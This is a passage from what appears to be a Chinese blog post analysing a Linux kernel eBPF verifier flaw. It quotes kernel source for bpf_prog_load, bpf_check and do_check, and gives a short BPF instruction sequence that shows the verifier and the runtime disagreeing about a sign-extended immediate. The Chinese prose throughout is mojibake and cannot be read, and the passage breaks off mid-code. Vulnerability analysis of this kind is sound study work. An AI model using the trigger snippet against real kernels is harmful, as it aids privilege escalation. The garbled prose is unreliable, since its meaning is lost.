class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span> =</span> attr-&gt;prog_type;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line">  <span class="keyword">char</span> license[<span class="number">128</span>];</span><br><span class="line">  <span class="keyword">bool</span> is_gpl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy eBPF program license from user space */</span></span><br><span class="line">  <span class="keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),</span><br><span class="line">                        <span class="keyword">sizeof</span>(license) - <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  license[<span class="keyword">sizeof</span>(license) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span></span><br><span class="line">  is_gpl = license_is_gpl_compatible(license);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;</span><br><span class="line">      attr-&gt;kern_version != LINUX_VERSION_CODE)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* plain bpf_prog allocation */</span></span><br><span class="line">  prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);</span><br><span class="line">  <span class="keyword">if</span> (!prog)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_charge_memlock(prog);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_prog_nouncharge;</span><br><span class="line"></span><br><span class="line">  prog-&gt;len = attr-&gt;insn_cnt;</span><br><span class="line"></span><br><span class="line">  err = -EFAULT;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),</span><br><span class="line">                     prog-&gt;len * <span class="keyword">sizeof</span>(struct bpf_insn)) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  prog-&gt;orig_prog = <span class="literal">NULL</span>;</span><br><span class="line">  prog-&gt;jited = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">  prog-&gt;gpl_compatible = is_gpl ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* find program type: socket_filter vs tracing_filter */</span></span><br><span class="line">  err = find_prog_type(type, prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* run eBPF verifier */</span></span><br><span class="line">  err = bpf_check(&amp;prog, attr);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* fixup BPF_CALL-&gt;imm field */</span></span><br><span class="line">  fixup_bpf_calls(prog);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF program is ready to be JITed */</span></span><br><span class="line">  err = bpf_prog_select_runtime(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_new_fd(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* failed to allocate fd */</span></span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  free_used_maps:</span><br><span class="line">  free_used_maps(prog-&gt;aux);</span><br><span class="line">  free_prog:</span><br><span class="line">  bpf_prog_uncharge_memlock(prog);</span><br><span class="line">  free_prog_nouncharge:</span><br><span class="line">  bpf_prog_free(prog);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨19è¡Œå¯¹ebpf licenseè¿›è¡ŒéªŒè¯æ˜¯å¦ä¸ºGPLè¯ä¹¦çš„ä¸€ç§ï¼Œåœ¨21è¡Œæ£€éªŒäº†ä¼ å…¥ä»£ç çš„é•¿åº¦ï¼Œç„¶åé€šè¿‡<code>find_prog_type</code>å‡½æ•°åˆ¤æ–­è¿‡æ»¤æ¨¡å¼ï¼Œå…¶ä¸­socket_filteræ˜¯æ•°æ®åŒ…è¿‡æ»¤ï¼Œè€Œtracing_filterå°±æ˜¯å¯¹ç³»ç»Ÿè°ƒç”¨å·åŠå‚æ•°çš„è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è§çš„seccompã€‚æœ€åè¿›å…¥<code>bpf_check</code>å‡½æ•°è¿›è¡Œè¿›ä¸€æ­¥éªŒè¯ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> __user *log_ubuf = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> *<span class="title">env</span>;</span></span><br><span class="line">  <span class="keyword">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((*prog)-&gt;len &lt;= <span class="number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,</span></span><br><span class="line"><span class="comment">	 * allocate/free it every time bpf_check() is called</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">  env = kzalloc(<span class="keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!env)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  env-&gt;prog = *prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* grab the mutex to protect few globals used by verifier */</span></span><br><span class="line">  mutex_lock(&amp;bpf_verifier_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;</span><br><span class="line">    <span class="comment">/* user requested verbose verifier output</span></span><br><span class="line"><span class="comment">		 * and supplied buffer to store the verification trace</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">    log_level = attr-&gt;log_level;</span><br><span class="line">    log_ubuf = (<span class="keyword">char</span> __user *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) attr-&gt;log_buf;</span><br><span class="line">    log_size = attr-&gt;log_size;</span><br><span class="line">    log_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = -EINVAL;</span><br><span class="line">    <span class="comment">/* log_* values have to be sane */</span></span><br><span class="line">    <span class="keyword">if</span> (log_size &lt; <span class="number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="number">8</span> ||</span><br><span class="line">        log_level == <span class="number">0</span> || log_ubuf == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line"></span><br><span class="line">    ret = -ENOMEM;</span><br><span class="line">    log_buf = vmalloc(log_size);</span><br><span class="line">    <span class="keyword">if</span> (!log_buf)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    log_level = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ret = replace_map_fd_with_map_ptr(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(struct verifier_state_list *),</span><br><span class="line">                                 GFP_USER);</span><br><span class="line">  ret = -ENOMEM;</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;explored_states)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  ret = check_cfg(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span><br><span class="line"></span><br><span class="line">  ret = do_check(env);</span><br><span class="line"></span><br><span class="line">  skip_full_check:</span><br><span class="line">  <span class="keyword">while</span> (pop_stack(env, <span class="literal">NULL</span>) &gt;= <span class="number">0</span>);</span><br><span class="line">  free_states(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* program is valid, convert *(u32*)(ctx + off) accesses */</span></span><br><span class="line">    ret = convert_ctx_accesses(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="number">1</span>) &#123;</span><br><span class="line">    BUG_ON(log_len &gt;= log_size);</span><br><span class="line">    <span class="comment">/* verifier log exceeded user supplied buffer */</span></span><br><span class="line">    ret = -ENOSPC;</span><br><span class="line">    <span class="comment">/* fall through to return what was recorded */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy verifier log back to user space including trailing zero */</span></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    ret = -EFAULT;</span><br><span class="line">    <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;</span><br><span class="line">    <span class="comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span></span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,</span><br><span class="line">                                              <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]),</span><br><span class="line">                                              GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;</span><br><span class="line">      ret = -ENOMEM;</span><br><span class="line">      <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,</span><br><span class="line">           <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]) * env-&gt;used_map_cnt);</span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span></span><br><span class="line"><span class="comment">		 * bpf_ld_imm64 instructions</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">    convert_pseudo_ld_imm64(env);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  free_log_buf:</span><br><span class="line">  <span class="keyword">if</span> (log_level)</span><br><span class="line">    vfree(log_buf);</span><br><span class="line">  free_env:</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)</span><br><span class="line">    <span class="comment">/* if we didn&#x27;t copy map pointers into bpf_prog_info, release</span></span><br><span class="line"><span class="comment">		 * them now. Otherwise free_bpf_prog_info() will release them.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">    release_maps(env);</span><br><span class="line">  *prog = env-&gt;prog;</span><br><span class="line">  kfree(env);</span><br><span class="line">  mutex_unlock(&amp;bpf_verifier_lock);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé¦–å…ˆæ˜¯ä½¿ç”¨<code>check_cfg</code>å‡½æ•°å€Ÿç”¨äº†ç¨‹åºæ§åˆ¶æµå›¾çš„æ€è·¯æ¥æ£€æŸ¥è¿™ä¸ªEBPFç¨‹åºä¸­æ˜¯å¦æœ‰æ­»å¾ªç¯å’Œè·³è½¬åˆ°æœªåˆå§‹åŒ–çš„ä½ç½®ï¼Œé¿å…é€ æˆæ— æ³•é¢„æœŸçš„é£é™©ã€‚æœ€ååˆ™æ˜¯ä½¿ç”¨<code>do_check</code>å‡½æ•°æ¨¡æ‹Ÿæ‰§è¡Œä¸€æ¬¡æ³¨å…¥ä»£ç ï¼Œä¼šå°†æ³¨å…¥ä»£ç çš„æ‰€æœ‰é€»è¾‘åˆ†æ”¯ä»å¤´åˆ°å°¾éƒ½ä¼šè¢«å®Œå…¨è·‘ä¸Šä¸€éï¼Œä¼šæ¨¡æ‹Ÿæ¯æ¡æŒ‡ä»¤çš„æ‰§è¡Œï¼ŒåŒ…æ‹¬å †æ ˆã€å¯„å­˜å™¨ã€è®¿é—®å†…å­˜ã€è°ƒç”¨å‡½æ•°ç­‰ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™é‡Œçš„æ¼æ´å‘ç”Ÿåœ¨<code>do_check</code>å‡½æ•°å’Œæœ€åçœŸæ­£è¿è¡Œçš„<code>__bpf_prog_run</code>ç¿»è¯‘ç»“æœä¸ä¸€è‡´å¯¼è‡´çš„ã€‚è¿™é‡Œç”¨å¦‚ä¸‹ä»£ç æ¥æ¼”ç¤ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆçœ‹ä¸€ä¸‹<code>do_check</code>å‡½æ•°ä¸­å¤„ç†çš„äº‹æƒ…ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">init_reg_state(regs);</span><br><span class="line">insn_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span>;</span></span><br><span class="line">	u8 <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;</span><br><span class="line">		verbose(<span class="string">&quot;invalid insn idx %d insn_cnt %d\n&quot;</span>,</span><br><span class="line">			insn_idx, insn_cnt);</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	insn = &amp;insns[insn_idx]; </span><br><span class="line">	<span class="class"><span class="keyword">class</span> =</span> BPF_CLASS(insn-&gt;code);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªforæ­»å¾ªç¯ï¼Œæœ€åä¼šè¿”å›<code>BPF_CLASS</code>è·å¾—çš„æŒ‡ä»¤æ“ä½œç ç±»å‹ã€‚</p>
<p>ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯<code>BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)</code>ï¼ŒBPF_MOVæŒ‡ä»¤å±äºALUå¤§ç±»ä¸­ï¼Œåœ¨æ£€æµ‹åˆ°æŒ‡ä»¤ç±»å‹æ˜¯ALUï¼Œè¿›å…¥å¦‚ä¸‹åˆ†æ”¯ï¼Œè°ƒç”¨<code>check_alu_op()</code>å‡½æ•°ç»§ç»­åˆ¤æ–­ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123;</span><br><span class="line">	err = check_alu_op(env, insn);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®<code>check_alu_op()</code>å‡½æ•°ï¼Œä¸Šé¢è¿™æ¡ä»£ç çš„æŒ‡ä»¤æ“ä½œç ä¸ºBPF_MOVï¼Œè¿›å…¥å¦‚ä¸‹åˆ†æ”¯ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">      <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">        <span class="comment">/* case: R1 = R2</span></span><br><span class="line"><span class="comment">				 * copy register state to dest reg</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">        regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">          verbose(<span class="string">&quot;R%d partial copy of pointer\n&quot;</span>,</span><br><span class="line">                  insn-&gt;src_reg);</span><br><span class="line">          <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">        regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;</span><br><span class="line">        regs[insn-&gt;dst_reg].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//BPF_K</span></span><br><span class="line">      <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">			 * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">      regs[insn-&gt;dst_reg].type = CONST_IMM; </span><br><span class="line">      regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ€åæ˜¯å°†æŒ‡ä»¤çš„ç«‹å³æ•°ä¿å­˜åˆ°äº†reg_stateç»“æ„ä½“ä¸­çš„ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span></span><br><span class="line">    <span class="keyword">int</span> imm;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">		 *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„immä¹Ÿæ˜¯æœ‰ç¬¦å·æ•´æ•°ï¼Œå’Œ<code>bpf_insn</code>ç»“æ„ä½“ä¸­çš„immç±»å‹ä¸€è‡´ã€‚<br>æ£€æŸ¥ç¬¬äºŒæ¡æŒ‡ä»¤<code>BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)</code>ï¼Œè¿™æ˜¯ä¸€æ¡JMPæŒ‡ä»¤ï¼Œåœ¨<code>do_check</code>å‡½æ•°ä¸­ä¼šè¿›å…¥å¦‚ä¸‹åˆ†æ”¯ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_JMP) &#123;</span><br><span class="line">  u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_CALL uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = check_call(env, insn-&gt;imm);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) 